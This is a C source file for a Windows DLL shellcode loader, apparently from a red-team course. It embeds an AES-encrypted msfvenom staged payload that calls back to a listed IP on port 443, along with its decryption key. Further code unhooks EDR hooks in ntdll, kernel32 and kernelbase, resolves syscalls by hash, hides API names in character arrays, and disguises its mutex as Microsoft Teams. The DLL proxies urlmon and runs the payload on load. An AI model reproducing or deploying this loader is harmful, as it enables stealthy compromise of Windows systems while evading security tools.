/*

 Red Team Operator course code template
 Module stomping

 author: reenz0h (twitter: @SEKTOR7net)

*/
#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "peb_structs.h"
#include "definitions.h"



#pragma comment (lib, "advapi32") 
#pragma comment(linker, "/export:CoInternetCreateSecurityManager=C:\\Windows\\System32\\urlmon.CoInternetCreateSecurityManager,@135")


//msfvenom staged payload -f raw then aes encrypted.  172.16.193.129 443 -> will not get flagged if i unhook these three libraries -> kernel32.dll, kernelbase, ntdll.dll
//these libs likely need to be unhooked b/c the 2nd stage payload makes use of some functions that are hooked, even tho the first stage gets by effortlessly and doesn't get picked up on a disk scan.
unsigned char payload[] = { 0xcf, 0xd4, 0xca, 0x7e, 0x55, 0x25, 0x65, 0x71, 0x99, 0x25, 0xd8, 0x3a, 0x71, 0xdd, 0x6c, 0xfb, 0x5c, 0x8b, 0x3d, 0x5e, 0xb1, 0xed, 0x88, 0x70, 0xb8, 0x6c, 0x94, 0xd8, 0xa5, 0xb0, 0xc5, 0x78, 0x86, 0xdb, 0x67, 0x9b, 0x3, 0x60, 0x51, 0xa3, 0xdc, 0xb5, 0xe9, 0x5, 0xc4, 0x46, 0xa3, 0x29, 0xe3, 0x9c, 0x35, 0xec, 0xa7, 0xaa, 0xf5, 0x55, 0x55, 0xfc, 0x53, 0xf3, 0x1a, 0x58, 0xb4, 0x3, 0x6c, 0x56, 0x5c, 0xa7, 0x2, 0x75, 0x7e, 0xf7, 0xdf, 0x48, 0xac, 0xa3, 0x39, 0xb6, 0x69, 0x0, 0x42, 0xd3, 0x99, 0x1c, 0x29, 0xb4, 0xd2, 0x58, 0x8a, 0xd5, 0x59, 0xe4, 0x4c, 0x19, 0xc1, 0x5e, 0xdc, 0xff, 0x60, 0xa3, 0xd8, 0x6b, 0xc2, 0x64, 0x85, 0xe2, 0x78, 0xb4, 0xa3, 0xc6, 0x9f, 0xf3, 0xe9, 0xaa, 0x50, 0x4b, 0xdd, 0x47, 0xb3, 0x6f, 0x99, 0xbd, 0x24, 0xf9, 0xea, 0xbf, 0x3, 0x90, 0x90, 0xd8, 0xf6, 0x9c, 0xb8, 0xdb, 0x14, 0xc0, 0xdf, 0x31, 0x46, 0xa3, 0xfe, 0xbd, 0xe6, 0xb5, 0x4, 0xdf, 0xfb, 0x5f, 0x36, 0xc5, 0xb1, 0x68, 0xc1, 0x49, 0x46, 0x31, 0xff, 0x1c, 0xc3, 0x6e, 0xc5, 0x4c, 0x9d, 0x5c, 0x1f, 0x70, 0x8e, 0x5f, 0xb9, 0x8e, 0x94, 0xaf, 0x1c, 0x50, 0x23, 0xe0, 0xa0, 0xb9, 0xca, 0x22, 0x47, 0xa7, 0xaa, 0x1e, 0xc8, 0xb1, 0xa2, 0x2a, 0x78, 0x4a, 0x50, 0x8, 0xf5, 0x8d, 0x1e, 0x37, 0x9e, 0xb9, 0x29, 0x89, 0x91, 0xe7, 0x1f, 0x62, 0x68, 0xbe, 0x59, 0xf7, 0x6b, 0x97, 0x47, 0x4b, 0x72, 0x26, 0x94, 0xf7, 0xf3, 0x29, 0x32, 0x78, 0x9a, 0x9e, 0x78, 0xcb, 0x7, 0xe7, 0xa5, 0x9e, 0x4b, 0xb3, 0x22, 0x8f, 0xfa, 0x22, 0xdf, 0x3e, 0xcb, 0xf7, 0x49, 0xd3, 0x33, 0x53, 0x21, 0xbf, 0x9, 0xa4, 0x7e, 0xf8, 0x7c, 0x63, 0x52, 0xe2, 0x20, 0x1e, 0x9e, 0x6f, 0x6f, 0xfc, 0x9, 0x26, 0xa2, 0xc7, 0x8b, 0x35, 0xc9, 0x7e, 0xf5, 0x66, 0xb6, 0x6b, 0x11, 0xaf, 0xf8, 0xa9, 0xc3, 0x25, 0xc0, 0x7a, 0x1, 0x9, 0x7d, 0xe2, 0x70, 0xc9, 0x98, 0xc9, 0x4a, 0x9f, 0x55, 0x89, 0xa8, 0xb2, 0x4d, 0x43, 0x2d, 0xfc, 0x1e, 0x10, 0xe, 0xbf, 0x7c, 0x77, 0x3b, 0xbe, 0x5a, 0x6d, 0x13, 0x59, 0xf9, 0xac, 0x42, 0x40, 0xa7, 0x57, 0xc1, 0x8b, 0xbf, 0xab, 0xf4, 0x5b, 0xb4, 0xd3, 0xb5, 0x8b, 0x78, 0x9, 0x9, 0x3f, 0xe, 0x54, 0xda, 0x23, 0x66, 0x61, 0xe5, 0x68, 0x83, 0x94, 0x15, 0xb5, 0x1e, 0xca, 0xe1, 0x15, 0xdc, 0xe3, 0x7b, 0x1b, 0xc1, 0x69, 0xa4, 0x33, 0x1b, 0x0, 0xb0, 0x49, 0xdc, 0xbb, 0xc2, 0xd5, 0x69, 0x1e, 0x16, 0xcf, 0x98, 0x71, 0x15, 0xd2, 0xa9, 0x3a, 0x31, 0x3c, 0x81, 0x10, 0x1b, 0x14, 0xd1, 0xa2, 0x5d, 0xec, 0x54, 0xde, 0xf7, 0x20, 0xc7, 0xbf, 0xbe, 0x29, 0x24, 0x61, 0x2c, 0x42, 0x83, 0xe4, 0xb, 0x44, 0xd1, 0x55, 0x55, 0x57, 0xda, 0xb7, 0x53, 0xbe, 0xe2, 0xe4, 0x51, 0x95, 0xc8, 0xd4, 0x62, 0xb6, 0x9b, 0x6f, 0x52, 0xb0, 0xda, 0x27, 0xac, 0xe3, 0x7a, 0x86, 0x90, 0xf9, 0x60, 0xa8, 0xf, 0x63, 0xf1, 0xcd, 0xfc, 0x6d, 0xfe, 0xc9, 0x70, 0xbe, 0xdf, 0xee, 0x40, 0x75, 0xb7, 0x6a, 0x7a, 0xf2, 0x6a, 0x35, 0xdb, 0x97, 0xc7, 0x94, 0x3c, 0x77, 0x71, 0x47, 0x25, 0xf, 0x7e, 0xba, 0x57, 0x19, 0xbd, 0xf9, 0xe9, 0x37, 0x37, 0x77, 0x61, 0x5c, 0x8f, 0xf7, 0x61, 0xa3, 0xb2, 0xf3, 0xc0, 0x6e, 0x87, 0x7, 0xc0, 0x9, 0x33, 0x30, 0xa9, 0xe3, 0x28, 0xeb, 0x96, 0xbb, 0xbf, 0x3d, 0x2, 0xd9, 0xb6, 0xd3, 0x2b, 0x89, 0x3, 0x4a, 0x65, 0x98, 0x5f, 0xa6, 0xe7, 0x10, 0xfd, 0x43, 0x7d, 0x27, 0x6d, 0xf2, 0x8a, 0x31, 0x6f, 0x93, 0x3b, 0x2d, 0x5f, 0xe7, 0xda, 0x1c, 0x73, 0x86, 0xa1, 0x37, 0xa6, 0xd0, 0xf4, 0x4a, 0x6e, 0x79, 0xf6, 0x40, 0x89, 0x7, 0xdb, 0x37, 0xa4, 0xe4, 0x5e, 0x29, 0xc, 0xed, 0x95, 0x6c, 0x1, 0xfe, 0xa9, 0x28, 0x63, 0x8b, 0x31, 0xce, 0x9f, 0x9a, 0x7, 0xc5, 0x19, 0xad, 0x1b, 0x80, 0x46, 0x8, 0xa8, 0x6c, 0xb, 0xe1, 0x9f, 0x49, 0xbc, 0x7f, 0xb7, 0x8e, 0x8d, 0x45, 0x6c, 0x2c, 0x12, 0xde, 0x37, 0x45, 0xc4, 0xef, 0x4e, 0xd0, 0x4d, 0x6d, 0x61, 0xb4, 0xe4, 0xc1, 0xf9, 0xf1, 0xc9, 0xa9, 0xbf, 0xaf, 0xfa, 0xe3, 0x0, 0x7a, 0xf9, 0xb7, 0x77, 0xca, 0xea, 0x30, 0x6f, 0x59, 0x7, 0x3c, 0xad, 0x8a, 0xe0, 0x64, 0x19, 0xf3, 0xb8, 0x0, 0x7, 0xfe, 0x5c, 0x6e, 0x27, 0xe0, 0x33, 0x7, 0xb3, 0xd3, 0x22, 0x53, 0xe4, 0xfb, 0xb0, 0x64, 0xd5, 0x2d, 0xc1, 0x72, 0x70, 0x8, 0xe3, 0x89, 0x4, 0x1a, 0x81, 0x9a, 0xfb, 0xd6, 0xb5, 0xe3, 0xb0, 0xe1, 0x81, 0xac, 0x19, 0xac };
unsigned char key[] = { 0x3d, 0xa8, 0xaa, 0x53, 0x94, 0xde, 0xec, 0xf9, 0x9a, 0xbd, 0xfd, 0x95, 0xd6, 0x71, 0xb7, 0x63 };


SIZE_T payload_len = sizeof(payload);

HANDLE hMutex;

typedef DWORD(WINAPI* _WaitForSingleObject)(
	HANDLE hHandle,
	DWORD  dwMilliseconds
);
typedef LPVOID(WINAPI* _VirtualAlloc)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect

);
typedef BOOL(WINAPI* _WriteProcessMemory)(
	HANDLE  hProcess,
	LPVOID  lpBaseAddress,
	LPCVOID lpBuffer,
	SIZE_T  nSize,
	SIZE_T* lpNumberOfBytesWritten
);

typedef HANDLE(WINAPI* _CreateRemoteThread)(
	HANDLE                 hProcess,
	LPSECURITY_ATTRIBUTES  lpThreadAttributes,
	SIZE_T                 dwStackSize,
	LPTHREAD_START_ROUTINE lpStartAddress,
	LPVOID                 lpParameter,
	DWORD                  dwCreationFlags,
	LPDWORD                lpThreadId
);

_CreateRemoteThread CRT = NULL;
_WriteProcessMemory WPM = NULL;
_VirtualAlloc VA = NULL;
_WaitForSingleObject WFSO = NULL;

int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}

	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&payload_len)) {
		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}


void PopulateVxTable(PVX_TABLE table, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PLDR_DATA_TABLE_ENTRY pLdrDataEntry) {

	//populate api hashes in table.
	table->NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b;
	table->NtCreateThreadEx.dwHash = 0x64dc7db288c5015f;
	table->NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37;
	table->NtWaitForSingleObject.dwHash = 0xc6a2fa174e551bcb;
	table->NtQueryVirtualMemory.dwHash = 0x683158f59618ee0c;
	table->NtOpenProcess.dwHash = 0x718CCA1F5291F6E7;
	table->NtOpenFile.dwHash = 0x4A063563C4387908;
	table->NtCreateSection.dwHash = 0xF38A8F71AF24371F;
	table->NtMapViewOfSection.dwHash = 0xF037C7B73290C159;
	table->NtReadFile.dwHash = 0x4A06357E3033C3D2;
	table->NtCreateFile.dwHash = 0xE4672568EEF00D8A;

	//9618ee0c
	//0xffffffff9618ee0c
	//0x683158f59618ee0c

	//retieve api locations & syscalls and populate them in the table
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtAllocateVirtualMemory))
		return -1;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtCreateThreadEx))
		return -1;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtProtectVirtualMemory))
		return -1;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtWaitForSingleObject))
		return -1;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtQueryVirtualMemory))
		return -1;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtOpenProcess))
		return -1;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtOpenFile))
		return -1;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtCreateSection))
		return -1;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtMapViewOfSection))
		return -1;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtReadFile))
		return -1;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtCreateFile))
		return -1;
}



//This function obtains a pointer to the TEB using the GS register + 48 bytes (30 hex)
//then using the TEB we obtain a pointer to the PEB and return that value.
PPEB GetPointerToPEB() {
	PTEB pTEB = RtlGetThreadEnvironmentBlock();
	PPEB pPEB = pTEB->ProcessEnvironmentBlock;
	if (!pTEB || !pPEB || pPEB->OSMajorVersion != 0xA) {
		return -1;
	}
	return pPEB;
}

void SCInject() {


	//Decrypt our payload
	AESDecrypt(payload, payload_len, key, sizeof(key));
	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;

	pRemoteCode = VA(NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WPM(GetCurrentProcess(), pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);

	hThread = CRT(GetCurrentProcess(), NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
	if (hThread != NULL) {
		WFSO(hThread, 500);
		CloseHandle(hThread);
		return 0;
	}
	return;
}


int go(void) {
	DWORD waitResponse = 0;
	hMutex = CreateMutex(NULL, FALSE, TEXT("MicosoftTeamsProcMu"));
	if (hMutex != NULL)
		if (GetLastError() == ERROR_ALREADY_EXISTS) {
			return(0);
		}

	waitResponse = WaitForSingleObject(hMutex, INFINITE);
	if (waitResponse != 0)
		return 0;

	//ShowWindow(GetConsoleWindow(), SW_HIDE);

	//obtain pointer to PEB.
	PPEB pPEB = GetPointerToPEB();

	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPEB->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	//Get EAT Table
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return -1;
	//Create VXTable
	VX_TABLE table = { 0 };

	//Populate its entries
	PopulateVxTable(&table, pImageExportDirectory, pLdrDataEntry);

	UnhookingMainFunction(&table);
	WCHAR strKernel32dll[] = { 'K','e','r','n','e','l','3','2','.','d','l','l',0x0 };
	char strVirtualAlloc[] = { 'V','i','r','t','u','a','l','A','l','l','o','c',0x0 };
	char strWaitForSingleObject[] = { 'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t',0x0 };
	char strWriteProcessMemory[] = { 'W','r','i','t','e','P','r','o','c','e','s','s','M','e','m','o','r','y',0x0 };
	char strCreateRemoteThread[] = { 'C','r','e','a','t','e','R','e','m','o','t','e','T','h','r','e','a','d',0x0 };

	CRT = GetProcAddress(GetModuleHandleW(strKernel32dll), strCreateRemoteThread);
	WPM = GetProcAddress(GetModuleHandleW(strKernel32dll), strWriteProcessMemory);
	VA = GetProcAddress(GetModuleHandleW(strKernel32dll), strVirtualAlloc);
	WFSO = GetProcAddress(GetModuleHandleW(strKernel32dll), strWaitForSingleObject);

	SCInject();

	return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {

	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
		go();
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}